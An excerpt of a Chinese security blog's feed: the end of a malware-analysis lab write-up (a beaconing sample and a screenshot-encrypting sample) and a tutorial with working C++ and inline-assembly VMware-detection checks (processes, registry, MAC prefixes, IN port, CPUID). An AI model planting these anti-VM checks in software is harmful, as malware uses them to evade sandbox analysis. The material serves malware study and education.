title="7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"></a>7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？</h3><p>最大长度是12，注意这里的strncpy函数，指定了长度，为12，所以最大是12。加密的内容就是主机名</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/14.png"></p><h3 id="8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？"><a href="#8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？" class="headerlink" title="8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？"></a>8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？</h3><p>并没有看到填充的字符，因为我这里主机名正好为12位，根据base64编码的特性可以知道，是每三位变为四位，所以12位刚好扩充为16位无需填充，但是如果主机名不足12位，且其不能被3整除，就会出现填充字符。</p><h3 id="9-这个恶意代码做了什么？"><a href="#9-这个恶意代码做了什么？" class="headerlink" title="9.这个恶意代码做了什么？"></a>9.这个恶意代码做了什么？</h3><p>从资源节解密出一个域名，然后通过base64加密主机名，再和域名拼接形成一个URL，访问此URL，直到返回一个特定数据才会结束。</p><h2 id="Lab-13-2"><a href="#Lab-13-2" class="headerlink" title="Lab 13-2"></a>Lab 13-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑，可以看到有创建文件的行为，每隔一小会就会创建一个看起来是随机名称的文件。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-1.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-2.png"></p><p>使用IDA插件FindCrypt查找是否存在加密，没有找到</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-3.png"></p><p>查看主函数，看到流程很短，while循环是一个死循环，其中有两个sleep函数，还有一个<code>sub_401851</code>函数，根据火绒剑的结果分析，隔一段时间创建文件应该就是sleep函数的原因。那么这个函数应该就是创建文件的函数。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-4.png"></p><p>查看此函数，可以看到其中有一个<code>GetTickCount</code>函数，此函数获取自系统启动以来的毫秒数，然后将其拼接成为文件名tempXXX，这就解释了刚才看到那些文件名是怎么回事了。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-5.png"></p><p>看<code>sub_401070</code>函数，这是一个生成当前的屏幕截图的函数，在其中进行截图操作。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-6.png"></p><p>而<code>sub_40181F</code>函数就是加密的函数，查看其传入的参数也是内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-7.png"></p><p>现在尝试在加密之前将图像内容给dump出来，在加密函数之前可以看到传入的参数分别是要加密的内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-8.png"></p><p>在lordpe中转存这部分区域，之后改为BMP格式即可看到图片，确实是当前的截图</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-9.png"></p><h3 id="1-使用动态分析，确定恶意代码创建了什么？"><a href="#1-使用动态分析，确定恶意代码创建了什么？" class="headerlink" title="1.使用动态分析，确定恶意代码创建了什么？"></a>1.使用动态分析，确定恶意代码创建了什么？</h3><p>每隔一会会创建一个tempXXX文件</p><h3 id="2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"><a href="#2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？" class="headerlink" title="2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"></a>2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？</h3><p>没有找到很有用的东西</p><h3 id="3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"><a href="#3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？" class="headerlink" title="3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"></a>3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？</h3><p>CreateFile和WriteFile</p><h3 id="4-加密函数在反汇编的何处？"><a href="#4-加密函数在反汇编的何处？" class="headerlink" title="4.加密函数在反汇编的何处？"></a>4.加密函数在反汇编的何处？</h3><p>40181F</p><h3 id="5-从加密函数追溯原始的加密内容，原始加密内容是什么？"><a href="#5-从加密函数追溯原始的加密内容，原始加密内容是什么？" class="headerlink" title="5.从加密函数追溯原始的加密内容，原始加密内容是什么？"></a>5.从加密函数追溯原始的加密内容，原始加密内容是什么？</h3><p>原始的加密内容是屏幕截图</p><h3 id="6-你是否能够找到加密算法？如果没有，你如何解密这些内容？"><a href="#6-你是否能够找到加密算法？如果没有，你如何解密这些内容？" class="headerlink" title="6.你是否能够找到加密算法？如果没有，你如何解密这些内容？"></a>6.你是否能够找到加密算法？如果没有，你如何解密这些内容？</h3><p>加密算法就在<code>40181F</code>中，可以在加密之前将内容dump出来</p><h3 id="7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"><a href="#7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？" class="headerlink" title="7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"></a>7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？</h3><p>如详细分析中所述，那样操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-13-1&quot;&gt;&lt;a href=&quot;#Lab-13-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 13-1&quot;&gt;&lt;/a&gt;Lab 13-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机检测</title>
    <link href="https://b1ackie.cn/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    <id>https://b1ackie.cn/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/</id>
    <published>2021-09-28T02:14:54.000Z</published>
    <updated>2021-09-30T02:21:01.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一下一些虚拟机检测的手段，因为我只使用过VMware，所以我这里只记录自己对于VMware的检测，其他类型的虚拟机暂时没有用过，所以先暂且不提。</p><p>我个人对于虚拟机检测的理解，就是检测其中的各种特征，因为虚拟机运行和真实环境是有差距的，比如一些特定的服务，硬件名称等。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>在虚拟机中运行的时候，是有特定的进程的，比如图中两个进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/1.png"></p><p>这时就可以编写代码去检测是否存在指定的进程。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfProcExist</span><span class="hljs-params">(WCHAR* Procname)</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe32 = &#123; <span class="hljs-number">0</span> &#125;;<br>pe32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br>HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<span class="hljs-comment">//拍摄快照</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;pe32);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wcscmp</span>(Procname, pe32.szExeFile))<span class="hljs-comment">//判断是否是指定进程</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//找到返回TRUE</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>flag = <span class="hljs-built_in">Process32Next</span>(hSnap, &amp;pe32);<span class="hljs-comment">//没有找到搜索下一个</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//没有找到，不存在指定进程，返回FALSE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当在虚拟机运行时，检测到存在指定的进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/2.png"></p><p>不过这两个进程都是vmtool的进程，当我把vmtool卸载之后，就没有这两个进程了。所以如果在一个没有vmtool的环境中，可能还需要去寻找其他的一些特征来进行检测。</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>虚拟机环境中也有许多的标志是虚拟机的注册表，可以通过查询这些注册表来判断是否处在虚拟环境之中。</p><p>比如HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Drivers这个表项</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/3.png"></p><p>可以通过尝试打开此表项，判断是否存在来作为判断依据。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">OpenReg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;SOFTWARE\\VMware, Inc.\\VMware Drivers&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//是否能打开此表项</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//打不开返回FALSE</span><br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//打开返回TRUE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/4.png"></p><p>同时经过我测试发现，此表项也是vmtool的表项，如果卸载掉vmtool的话，此表项就不存在了。不过可用于判断的注册表项有许多，可以自己进行搜索并且实验来进行判断。我这里找到了如图的这个表项，应该是bios信息。那么可以根据这个来进行判断，比如查询SystemManufacturer中的值是否是<code>VMware, Inc.</code>来判断是否是虚拟机。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/5.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckRegValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;HARDWARE\\DESCRIPTION\\System\\BIOS&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//打开注册表</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwType;<br>WCHAR data[<span class="hljs-number">100</span>];<br>DWORD len = <span class="hljs-number">100</span>;<br><span class="hljs-built_in">RegQueryValueEx</span>(hKey, <span class="hljs-string">L&quot;SystemManufacturer&quot;</span>, <span class="hljs-literal">NULL</span>, &amp;dwType, (BYTE*)data, &amp;len);<span class="hljs-comment">//查询键值</span><br><span class="hljs-built_in">RegCloseKey</span>(hKey);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(data, <span class="hljs-string">L&quot;VMware, Inc.&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断键值是否相等</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE，虚拟机环境</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/6.png"></p><p>注册表里的信息非常的多，比如这里还有显卡的相对应信息，显卡名称，这也可以用来检测。具体的话，可以自己在虚拟机中的注册表内查找可以用于检测的特征。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/7.png"></p><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><p>虚拟机的MAC地址是有特定的特征的，比如它们都是固定的开头</p><blockquote><p>00:50:56:XX:XX:XX<br>00:1C:14:XX:XX:XX<br>00:0C:29:XX:XX:XX<br>00:05:69:XX:XX:XX</p></blockquote><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/8.png"></p><p>那么就可以通过判断当前系统的MAC地址的开头地址来判断是否处于虚拟机之中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckMacAddr</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">if</span> ((pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x50</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x56</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x1C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x14</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x0C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x29</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x05</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x69</span>))<span class="hljs-comment">//判断MAC地址前几位是否相同</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相同返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="特定的文件"><a href="#特定的文件" class="headerlink" title="特定的文件"></a>特定的文件</h2><p>在虚拟机中有一些驱动文件，可以通过查询这些文件是否存在来判断。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/9.png"></p><p>也不仅仅是这些驱动的文件，可以通过自己的查找，用其他的一些文件来做特征。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfFileExist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* FilePath)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (_access(FilePath, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断文件是否存在,0代表仅检查是否存在</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//存在返回TRUE</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/10.png"></p><h2 id="网关检测"><a href="#网关检测" class="headerlink" title="网关检测"></a>网关检测</h2><p>一般虚拟机中的网关地址如果不进行修改的话，最后一位都是2，那么可以通过检测网关地址的最后一位是否是2，来进行判断当前运行的环境。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/11.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckGateway</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">char</span> IP[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">sprintf</span>(IP, <span class="hljs-string">&quot;%s&quot;</span>, pInfo-&gt;GatewayList.IpAddress.String);<span class="hljs-comment">//网关的信息</span><br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(IP);<br>    <span class="hljs-keyword">char</span>* a = &amp;IP[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;2&quot;</span>, a) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断最后一位是否等于2</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/12.png"></p><h2 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h2><p>Vmware为主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”，可以通过此返回值判断是否处于虚拟机中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckIN</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>__try<br>&#123;<br>__asm <br>&#123;<br>pushad<br>mov eax,<span class="hljs-string">&#x27;VMXh&#x27;</span><br><span class="hljs-keyword">xor</span> ebx,ebx<br>mov ecx,<span class="hljs-number">0x0A</span><span class="hljs-comment">//功能号0x0A</span><br>mov edx,<span class="hljs-string">&#x27;VX&#x27;</span><br>in eax,dx<br>cmp ebx,<span class="hljs-string">&#x27;VMXh&#x27;</span><span class="hljs-comment">//判断返回值是否是VMXh</span><br>je _vm<span class="hljs-comment">//是的话返回TRUE</span><br>jmp _exit<br>_vm:<br>mov eax,TRUE<br>mov flag,eax<br>_exit:<br>popad<br>&#125;<br>&#125;<br>__except (EXCEPTION_EXECUTE_HANDLER)<br>&#123;<br>flag = FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/13.png"></p><h2 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h2><p>当eax=1时，运行CPUID之后，ecx中的值（转为二进制）如果最高位为1，那么就是在虚拟环境，否则不是。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CPUID</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag;<br>__asm<br>&#123;<br>pushad<br>pushfd<br>mov eax,<span class="hljs-number">1</span><br>cpuid<br><span class="hljs-keyword">and</span> ecx,<span class="hljs-number">0x80000000</span><span class="hljs-comment">//只留最高位进行判断</span><br>test ecx,ecx<span class="hljs-comment">//判断ecx寄存器是否为空，为空代表非虚拟机环境返回FALSE，否则返回TRUE</span><br>jz _Not<br>mov flag,TRUE<br>jmp _end<br>_Not:<br>mov flag,FALSE<br>_end:<br>popfd<br>popad<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/15.png"></p><p>当eax中的值是0x40000000时，ebx、ecx、edx三个寄存器中的返回值加起来正好是“VMWareVMWare”，可以把这个程序拖入OD，直接进行修改来查看。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/14.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结了一些可以使用的虚拟机检测的方式，但是感觉还是比较片面的，其中一些检测的特征也可以通过手动的方式来进行修改。</p><p>感觉反虚拟机还是游戏方面做的更好一些，如果能把网游反虚拟机的机制学习清楚的话应该还能学到更多的东西。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/">http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/</a></p><p><a href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p><p><a href="https://www.write-bug.com/article/1822.html">https://www.write-bug.com/article/1822.html</a></p><p><a href="https://bbs.pediy.com/thread-219955.htm">https://bbs.pediy.com/thread-219955.htm</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一</summary>
      
    
    
    
    <category term="虚拟机检测" scheme="https://b1ackie.cn/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="虚拟机检测" scheme="https://b1ackie.cn/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    
    <category term="编程" scheme="https://b1ackie.cn/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验12</title>
